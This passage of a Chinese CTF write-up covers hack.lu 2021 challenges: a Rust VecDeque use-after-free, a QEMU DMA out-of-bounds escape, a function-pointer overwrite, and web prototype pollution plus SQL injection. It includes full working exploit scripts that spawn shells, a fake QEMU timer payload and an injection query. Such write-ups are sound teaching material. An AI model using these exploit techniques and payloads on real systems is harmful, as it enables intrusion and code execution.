                    // The general problem looks like this
                    // GHIJKLM...ABCDEF - before any swaps
                    // ABCDEFM...GHIJKL - after 1 pass of swaps
                    // ABCDEFGHIJM...KL - swap until the left edge reaches the temp store
                    //                  - then restart the algorithm with a new (smaller) store
                    // Sometimes the temp store is reached when the right edge is at the end
                    // of the buffer - this means we've hit the right order with fewer swaps!
                    // E.g
                    // EF..ABCD
                    // ABCDEF.. - after four only swaps we've finished
                    while left_edge  Option {
            if self.is_empty() {
                None
            } else {
                let tail = self.tail;
                self.tail = self.wrap_add(self.tail, 1);
                unsafe { Some(self.buffer_read(tail)) }
            }
        }
    // ...
    #[stable(feature = "rust1", since = "1.0.0")]
    impl ExactSizeIterator for Iter {
        fn is_empty(&self) -> bool {
            self.head == self.tail
        }
    }
`self.head` 永远不会等于 `self.tail` 了。。。此时如果不断调用 `dq.pop_front();` ，就会产生下面的无限循环序列：
    a b c c a b c c ...
假如 `VecDeque` 的元素是分配在堆上的话，我们就有了 UAF/double free 的能力
####  利用:
搞清楚漏洞的成因后，接下来就是搞一些堆风水的 dirty work，控制 `highlighted_task`，得到任意地址读写的能力。
比赛期间我没有把一些原语搞清楚，很多都是连猜带懵慢慢调出来的，只求达到效果。
#####  泄漏堆地址:
将 `PasswordManager` 中保存 value 的 chunk 申请到将被 double free 的 chunk 上，然后再次 free
它，使用 1 功能，就可以泄漏堆地址了。
泄漏了堆地址修改时就可以使 `highlighted_task` 的 ptr 指针指向堆上伪造的 `Vec`，但先要考虑堆风水的问题。
#####  堆风水:
在我们连续 `pop_front` 后，tcache free list 已经被填满了，fastbin free list 也有一些 chunk。如果想要
UAF highlighted task，我们就要找到申请较小 chunk 且不会立即释放的原语。
这里我选择 `TaskQueue` 的 `push_back` 方法来清空 tcache free list。
还有一个原语是 `PasswordManager` 的 `insert` \+ `alter` 方法。调试发现 `alter` 会先申请替代的
`String`，再 drop 旧的 `String` 。但由于我对 Rust 标准库的 `HashMap` 实现不太熟悉，这个原语不是很可靠。。。
##### 控制 highlighed_task & 伪造 `Vec`:
清空 tcache free list 后，我们就通过 `PasswordManager` 的 `insert` \+ `alter` 方法申请到将被
UAF 的 highlighted_task，伪造其 ptr 指针和 cap、len。
其中 ptr 指针指向有两个 `Vec` 的堆空间，这两个 `Vec` 一个的 buf 指向存放着 libc
地址的堆空间，另一个指向 `__free_hook-0x8` 。
#####  泄漏 libc 地址
不断 insert_str 增加 String 长度（2 功能），String 在增长时会有大小大于 0x410 的 chunk 被 free 进
unsortedbin，这样堆上就有了 libc 地址。
借助伪造的 `Vec`，我们就可以用 6 功能泄漏 libc 地址了。
#####  写 __free_hook:
使用 5 功能同时写入 “/bin/sh” 和 system 地址
####  环境搭建:
因为该 Rust 程序依赖的动态链接库较多，patch 的程序堆风水和远程不一样，所以我选择在 Docker 中调试。
#####  Dockerfile & docker-compose.yml:
  * Dockerfile 
        # docker build -t unsafe . && docker run -p 4444:4444 --rm -it unsafe   FROM ubuntu:21.04 RUN apt update RUN apt install socat -y RUN useradd -d /home/ctf -m -p ctf -s /bin/bash ctf RUN echo "ctf:ctf" | chpasswd WORKDIR /home/ctf COPY flag . COPY unsafe . RUN chmod +x ./unsafe RUN chown root:root /home/ctf/unsafe RUN chown root:root /home/ctf/flag USER ctf CMD socat tcp-listen:4444,reuseaddr,fork exec:./unsafe,rawer,pty,echo=0
  * docker-compose.yml 
        version: '2'                                                     services: hacklu_2021_unsafe:   image: hacklu_2021:unsafe   build: .       container_name: hacklu_2021_unsafe   cap_add:                                               - SYS_PTRACE               security_opt:      - seccomp:unconfined   ports:    - "13000:4444"
加入 —cap-add 选项，这样就能在 docker 中 attach 进程了
####  pwndbg with Rust:
直接调试 pwndbg 会报错，无法查看堆的一些信息：
找到了对应的 issue：[no type named uint16 in rust
#855](https://github.com/pwndbg/pwndbg/issues/855)
只要在 run 或者 attach 前执行一下 `set language c` 就好了
####  exp:
写的有点乱 凑合看吧
    from pwn import *libc = ELF("./libc-2.33.so")class PasswordManager(object):        def insert(self, name, context):                io.send(p8(0))                size1 = len(name)                io.send(p8(size1))                for i in range(size1):                        ascii = ord(name[i])                        io.send(p8(ascii))                size2 = len(context)                io.send(p8(size2))                for i in range(size2):                        ascii = ord(context[i])                        io.send(p8(ascii))                io.recvuntil(b"\x7f\x7f\x7f\x7f")        def get(self, name):                io.send(p8(1))                size = len(name)                io.send(p8(size))                for i in range(size):                        ascii = ord(name[i])                        io.send(p8(ascii))                password = io.recvuntil(b"\x7f\x7f\x7f\x7f", drop=True)                print(b"password = " + password)                return password        def alter(self, name, new_context):                io.send(p8(2))                size = len(name)                io.send(p8(size))                for i in range(size):                        ascii = ord(name[i])                        io.send(p8(ascii))                size2 = len(new_context)                io.send(p8(size2))                for i in range(size2):                        ascii = ord(new_context[i])                        io.send(p8(ascii))                io.recvuntil(b"\x7f\x7f\x7f\x7f")        def alter_bytes(self, name, new_context):                io.send(p8(2))                size = len(name)                io.send(p8(size))                for i in range(size):                        ascii = ord(name[i])                        io.send(p8(ascii))                size2 = len(new_context)                io.send(p8(size2))                io.send(new_context)                io.recvuntil(b"\x7f\x7f\x7f\x7f")class HighlightedTask(object):        def add(self, context):            io.send(p8(7))            size = len(context)            io.send(p8(size))            for i in range(size):                ascii = ord(context[i])                io.send(p8(ascii))            io.recvuntil(b"\x7f\x7f\x7f\x7f")        def show(self, idx):                io.send(p8(6))                io.send(p8(idx))                content = io.recvuntil(b"\x7f\x7f\x7f\x7f", drop=True)                print(b"content = " + content)                return content        def alter(self, idx, new_context):                io.send(p8(5))                io.send(p8(idx))                size = len(new_context)                io.send(p8(size))                for i in range(size):                        ascii = ord(new_context[i])                        io.send(p8(ascii))                io.recvuntil(b"\x7f\x7f\x7f\x7f")        def alter_bytes(self, idx, new_context):                io.send(p8(5))                io.send(p8(idx))                size = len(new_context)                io.send(p8(size))                io.send(new_context)        def pop_set(self):                io.send(p8(4))                io.recvuntil(b"\x7f\x7f\x7f\x7f")        def push_back(self, task_list):                io.send(p8(3))                task_num = len(task_list)                io.send(p8(task_num))                for t in range(task_num):                        self.one_task(task_list[t])                io.recvuntil(b"\x7f\x7f\x7f\x7f")        def one_task(self, context_list):            vec_num = len(context_list)            io.send(p8(vec_num))            for i in range(vec_num):                size = len(context_list[i])                io.send(p8(size))                for j in range(size):                    ascii = ord(context_list[i][j])                    io.send(p8(ascii))#io = process("./unsafe")io = remote("flu.xxx", 20025)ht = HighlightedTask()task_list = []context_list1 = ['y' * 0x28, 'z' * 0x28]for i in range(2):    task_list.append(context_list1)ht.push_back(task_list)for i in range(2):    ht.pop_set()for i in range(4):    task_list.append(context_list1)context_list1 = ['j' * 0x58, 'k' * 0x58]task_list.append(context_list1)ht.push_back(task_list)for i in range(6):    ht.pop_set()ht.pop_set()pm = PasswordManager()context_list2 = ['s' * 0x28, 't' * 0x28]task_list = []for i in range(7):    task_list.append(context_list2)ht.push_back(task_list) # 把tcache free list 中的chunk全部申请完ht.pop_set() # 返回和上一次pop相同的highlighted_taskpm.insert('1' * 8, 'j' * 8)pm.alter('1' * 8, '\x00' * 0x11) # 这个value将被free，然后就可以泄漏堆地址了ht.pop_set()heap_addr = u64(pm.get('1' * 8)[8:16].ljust(8, b'\x00')) - 0x10print("heap_addr = " + hex(heap_addr))for i in range(10):    ht.pop_set()# 第二次利用VecDeque::make_contiguous中的漏洞task_list = []context_list1 = ['g' * 0x28, 'h' * 0x28]for i in range(2):    task_list.append(context_list1)print(task_list)ht.push_back(task_list)for i in range(2):    ht.pop_set()for i in range(4):    task_list.append(context_list1)context_list1 = ['n' * 0x58, 'o' * 0x58]task_list.append(context_list1)ht.push_back(task_list)for i in range(6):    ht.pop_set()ht.pop_set()context_list2 = ['a' * 0x28, 'i' * 0x28]task_list = []for i in range(20):    task_list.append(context_list2)ht.push_back(task_list) # 把tcache free list 中的chunk全部申请完ht.pop_set()pm.insert('2' * 1, 'j' * 2)#0x5070 0x5bc0 0x5ac0pm.alter_bytes('2' * 1, (p64(heap_addr + 0x59b0) + p64(0x2000) + p64(0x2000)).ljust(0x18, b'v'))pm.insert('3' * 1, 'j' * 0xff)for i in range(8):    pm.alter_bytes('3' * 1,  (p64(heap_addr + 0x5070) + p64(0x18) + p64(0x18)).ljust(0xfe, b'v'))libc.address = u64(ht.show(0)[16:]) - 0x1e0c00print("libc.address = " + hex(libc.address))pm.alter_bytes('3' * 1,  (p64(0xdeadbeef) * 2 + p64(libc.symbols["__free_hook"] - 0x8) + p64(0x30) + p64(0x50)).ljust(0xfe, b'v'))ht.alter_bytes(0xc, b"/bin/sh\x00" + p64(libc.symbols["system"]))io.interactive()
###  Stonks Socket(high):
###  Cloudinspect(Mid):
比较简单的QEMU题目，还给了源码，对新手极其友好  
先贴个交互脚本，作用是连接远程，然后输入可执行文件
    from pwn import *import oslocal=0aslr=Truecontext.log_level="debug"#context.terminal = ["deepin-terminal","-x","sh","-c"]if local==1:    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})    p = process("./run_chall.sh",aslr=aslr)    #gdb.attach(p)else:    remote_addr=['flu.xxx', 20065]    p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)sn = lambda x : p.send(x)rl = lambda   : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)def lg(s):    print('\033[1;31;40m{s}\033[0m'.format(s=s))def raddr(a=6):    if(a==6):        return u64(rv(a).ljust(8,'\x00'))    else:        return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__':    if not local:        ru("size:")    os.system("musl-gcc ./exp/exp.c --static -o ./exp/exp")    poc = open("./exp/exp", "rb").read()    size = len(poc)    sl(str(size))    ru(b"Now send the file\n")    sn(poc)    p.interactive()
主要功能就是这几个
    void SetDMACMD(size_t val) {  pcimem_write(0x78, 'q', val, 0);}void SetDMASRC(size_t val) {  pcimem_write(0x80, 'q', val, 0);}void SetDMADST(size_t val) {  pcimem_write(0x88, 'q', val, 0);}void SetDMACNT(size_t val) {  pcimem_write(0x90, 'q', val, 0);}size_t TriggerDMAWrite() {  size_t val = 0;  pcimem_write(0x98, 'q', val, 0);  return val;}size_t GetDMACMD() {  size_t val = 0;  pcimem_read(0x78, 'q', &val, 0);  return val;}size_t GetDMASRC() {  size_t val = 0;  pcimem_read(0x80, 'q', &val, 0);  return val;}size_t GetDMADST() {  size_t val = 0;  pcimem_read(0x88, 'q', &val, 0);  return val;}size_t GetDMACNT() {  size_t val = 0;  pcimem_read(0x90, 'q', &val, 0);  return val;}
漏洞在这，没有对dma的offset进行检查，从而可以基于dma_buf进行上下越界读写，注意由于dma_buf不大，从而这个硬件的state结构体是在堆地址上的，如果是mmap的其实还有骚操作，这里就不说了
这里注意下，这里的as是address_space_memory，因此dma可以直接对用户态分配的内存进行，如果是pci的地址空间，则需要写内核驱动交互
利用方法很简单，先泄露硬件state的地址和qemu的基地址。泄露state的方法是state结构体前内嵌的pci
state结构体里有指向硬件state的指针，bingo
      SetDMACMD(1);  SetDMASRC(-0xa08);  SetDMADST(buffer_phyaddr);  SetDMACNT(0x1000);  TriggerDMARead();  size_t DMA_BUF_ADDR = buffer[0xc0 / 8] + 0xa08;  size_t code_base = buffer[0x2c8 / 8] - 0xd6af00;
然后就是通过伪造main_loop_tlg内的time_list_group内的timer_list内的active_timer的方法，这个方法自多年前强网杯提出来就一直是通用方法了，具体可以看看exp怎么搞的，注意伪造的时候不能破坏qemu_clocks、lock的active等基本检查
      char *payload = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);  char cmd[] = "cat flag\x00";  memcpy((void *)(payload + 0x8 + 0x100 + sizeof(struct QEMUTimerList ) + sizeof(struct QEMUTimer )),  \                (void *)cmd,                sizeof(cmd));  size_t main_loop_tlg_addr = 0xe93e40 + code_base;  size_t qemu_timer_notify_cb_addr = code_base + 0x540E50;  *(size_t*)payload = main_loop_tlg_addr + 0x20 + 0x100;  struct QEMUTimerList *tl = (struct QEMUTimerList *)(payload + 0x8 + 0x100);  struct QEMUTimer *ts = (struct QEMUTimer *)(payload + 0x8 + 0x100 + sizeof(struct QEMUTimerList));  void *fake_timer_list =(void *)(main_loop_tlg_addr + 0x20 + 0x100);  void *fake_timer = (void *)((size_t)fake_timer_list + sizeof(struct QEMUTimerList));  void *system_plt = code_base + 0x2B3D60;  void *cmd_addr = fake_timer + sizeof(struct QEMUTimer);  *(size_t *)(payload + 8 + 3 * 0x10 + 0) = (size_t)fake_timer_list;  *(char *)(payload + 8 + 3 * 0x10 + 0xc) = 1;  /* Fake Timer List */  printf("fake timer list\n");  tl->clock = (void *)(main_loop_tlg_addr + 0x20 + 3 * 0x10);  *(size_t *)&tl->active_timers_lock[0x28] = 1;  tl->active_timers = fake_timer;  tl->le_next = 0x0;  tl->le_prev = 0x0;  tl->notify_cb = (void *)qemu_timer_notify_cb_addr;  tl->notify_opaque = 0x0;  tl->timers_done_ev = 0x0000000100000000;  /*Fake Timer structure*/  ts->timer_list = fake_timer_list;  ts->cb = system_plt;  ts->opaque = cmd_addr;  ts->scale = 1000000;  ts->expire_time = -1;
接着就是通过越界写去篡改main_loop_tlg，为了方便减少误差，注意两点。一个是直接使用qemu的plt表内的函数，不要去泄露libc，那样就画蛇添足了；另一个是伪造tlg的时候尽量一次写完，但是要对qemu_clocks进行伪造，可以在实际利用时提高稳定性
      SetDMACMD(1);  SetDMADST(main_loop_tlg_addr - DMA_BUF_ADDR + 0x18);  SetDMASRC(virt2phys(payload));  SetDMACNT(0x200);  TriggerDMAWrite();
提一下，用musl-gcc可以在静态编译时极大地减小exp大小
###  secure-prototype(low):
这道题目没有开启PIE，意味着我们可以随意去预测任意地址。  
根据分析发现，这道题目除了39321的DEBUG功能外，还有1056这一个功能。
这个功能编辑了off_22050的函数指针
而这个函数指针在4919功能中被调用。  
因此，我们可以通过传入参数更改该函数指针，随后可以达到任意执行函数的效果。  
此处改为plt表中的scanf函数
随后即可改写任意内存。  
而在功能48中，程序打开了filename字符串所指向的文件，因此我们可以改写filename字符串达到任意读文件的目的。
接下来要解决的是scanf的参数，参数2已经有了（filename字符串所在的地址），参数1可以查找%s字符串位置，在这里：
大致思路有了，接下来构造exp:  
发送 1056 66928 0 0 改写函数指针到scanf函数  
发送 4919 70140 139352 0 调用scanf函数，其中两个参数分别为%s和filename的地址  
发送 flag.txt 改写filename为flag.txt  
发送 48 0 0 0 执行读文件操作，即可读到flag.txt文件
## Web:
###  trading-api(High):
GET token：
    {    "username":"../../../../health?rdd/.",    "password":"aaaa"}
拿到token能访问的接口： （但是没数据可以读）  
写下思路：
  1. if (regex.test(req.url) && !hasPermission(userPermissions, username, permission)) {  
这里是and ，所以满足regex.test(req.url) = 0也是可以绕过校验，访问api/priv/assets  
满足hasPermission需要构造出username为warrenbuffett69的jwt
  2. 在api/priv/assets里注入or二次注入
路由的c解析库可能有问题，碰到#会把\变成/，但是req.url还是/api\priv/，可以绕过正则
这里不难看出可以原型链污染，但是要配合最后的注入，把我们的payload注入进去
这里escapedParams的遍历key可以把我们上一步构造的原型链污染的key获取到
这里的  
username =
“../../::txId/../health?/.”的构造，其实是利用replaceall，先把:txId替换成199152684014119，然后利用原型链注入进去的199152684014119这个key，将:199152684014119替换成我们的恶意sql
最后的query就是
    INSERT INTO transactions (id, asset, amount, username) VALUES (95187879456802, '__proto__', -1, '../../'||(select flag from flag)||'/../health?/.')
最后附上简单的解题过程：
###  Diamond Safe(Mid):
题目附件下下来
先看login.php中的代码
    $query = db::prepare("SELECT * FROM `users` where password=sha1(%s)", $_POST['password']);
    if (isset($_POST['name'])){
        $query = db::prepare($query . " and name=%s", $_POST['name']);
    }
    else{
        $query = $query . " and name='default'";
    }
        $query = $query . " limit 1";
        $result = db::commit($query);
其中prepare处的代码[DB.class.php]：
    public static function prepare($query, $args){
            if (is_null($query)){
                return;
            }
            if (strpos($query, '%') === false){
                error('%s not included in query!');
                return;
            }
            // get args
            $args = func_get_args();
            array_shift( $args );